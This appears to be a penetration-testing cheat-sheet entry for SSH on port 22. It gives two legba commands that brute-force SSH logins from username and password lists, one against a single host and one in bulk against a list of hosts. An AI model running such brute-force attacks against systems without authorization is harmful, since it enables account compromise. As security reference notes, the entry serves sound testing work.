# 22 - SSH

## Potential Risks

### Brute Force

```bash
# https://github.com/evilsocket/legba
legba ssh --target $RHOST:$RPORT \
    --username $USER_LIST \
    --password $PASS_LIST \
    --output-format jsonl --output ssh_brute.json

# Bulk testing
legba ssh --target @$RHOST_LIST \
    --username $USER_LIST \
    --password $PASS_LIST \
    --output-format jsonl --output ssh_brute.json
```
